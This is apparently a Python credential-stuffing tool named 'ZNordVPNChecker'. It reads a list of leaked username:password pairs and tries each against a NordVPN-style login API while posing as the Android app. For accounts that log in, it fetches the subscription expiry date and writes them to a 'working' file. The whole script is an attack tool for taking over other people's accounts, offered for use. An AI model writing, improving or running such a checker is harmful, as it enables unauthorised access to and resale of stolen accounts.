# -*- coding: utf-8 -*-

import base64, re, requests, 

print(u"\u001b[31m██████╗ ██╗     ██╗  ██╗██╗  ██╗██████╗  ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ \n██╔══██╗██║     ╚██╗██╔╝╚██╗██╔╝██╔══██╗██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗\n██████╔╝██║      ╚███╔╝  ╚███╔╝ ██║  ██║██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝\n██╔══██╗██║      ██╔██╗  ██╔██╗ ██║  ██║██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗\n██████╔╝███████╗██╔╝ ██╗██╔╝ ██╗██████╔╝╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║\n╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\u001b[0m")

def login(combo):
	try:
		url = "https://zwyr157wwiu6eior.com/v1/users/tokens"
		headers = {
	       "accept": "*/*",
	       "user-agent": "NordApp android (playstore/2.7.3) Android 8.1.0",
	       "content-type": "application/x-www-form-urlencoded",
        }
		data = combo.split(":")
		r = requests.post(url, headers=headers, data="username="+data[0]+"&password="+data[1])
		f= open("tmp.blxxd","w+")
		f.write(r.text)
		f.close()
		return r.text
	except:
		print(f"\n\u001b[31m[ZNordVPNChecker] » ¡ERROR! Check your internet connection or your IP (server rate limited) and try again.\u001b[0m"+"\n")

def main(): 
	list = open(input(f"\n\u001b[36m[ZNordVPNChecker] » Insert your NordVPN combolist file name:\u001b[0m "), "r").read().splitlines()
	print("")
	for combo in list:
		if "\"token\":" in login(combo):
			fopen = open("tmp.blxxd","r").read()	  
			regex = r"\"token\":\"(.+?)\""
			test_str =str(fopen)
			matches = re.finditer(regex, test_str, re.MULTILINE)
			for matchNum, match in enumerate(matches, start=1):				
				for groupNum in range(0, len(match.groups())):
					groupNum = groupNum + 1		
					token = "{group}".format(groupNum = groupNum, start = match.start(groupNum), end = match.end(groupNum), group = match.group(groupNum))
					message = "token:"+token
					message_bytes = message.encode('ascii')
					base64_bytes = base64.b64encode(message_bytes)
					base64_message = base64_bytes.decode('ascii')
					b64 = base64_message
					url2 = "https://zwyr157wwiu6eior.com/v1/users/services"
					headers2 = {
	                   "accept": "*/*",
	                   "user-agent": "NordApp android (playstore/2.7.3) Android 8.1.0",
	                   "content-type": "application/x-www-form-urlencoded",
	                   "Authorization": "Basic "+b64
                    }
					r2 = requests.get(url2, headers=headers2)
					#print(r2)
					cap = r2.text
					regex2 = r"\"expires_at\":\"(.+?)\""
					test_str2 =cap
					matches2 = re.finditer(regex2, test_str2, re.MULTILINE)
					for matchNum2, match in enumerate(matches2, start=1):				 
						for groupNum2 in range(0, len(match.groups())):
							groupNum2 = groupNum2 + 1					   
							exp = "{group}".format(groupNum2 = groupNum2, start = match.start(groupNum2), end = match.end(groupNum2), group = match.group(groupNum2))
			try:
				f = open("working.txt", "a")
				f.write(combo + "| [WORKING] Date: " + str(exp) + "\n")
				f.close()
				print (f"\u001b[32m[WORKING] » "+ combo +" | Date: " + str(exp))
			except:
				print(f"\u001b[33m[WORKING (NO SERVICE)] » " + combo)
				f.write(combo + " | [WORKING (NO SERVICE)]\n")
				f.close()
		else:
			if "nginx" in login(combo):
				last = open("tmplast.blxxd","a")
				last.truncate(0)
				last.write(combo+"\n")
				last.close()
				openlast = open("tmplast.blxxd","r").read()
				
				print(f"\n\u001b[31m[ZNordVPNChecker] » ¡ERROR! Check your internet connection or your IP (server rate limited) and try again.\u001b[0m"+"\n")
				if "name=" not in openlast:			 
					print("Last Combo: "+ openlast)
				else:
					print("Last Combo: "+ openlast)
					pass				
				return
			else:
				print (f"\u001b[31m[NOT WORKING] » "+ combo)

if __name__ == "__main__":
	main()
	print(f"\n\u001b[32m[ZNordVPNChecker] » Finished checking your NordVPN accounts.\u001b[0m\n")
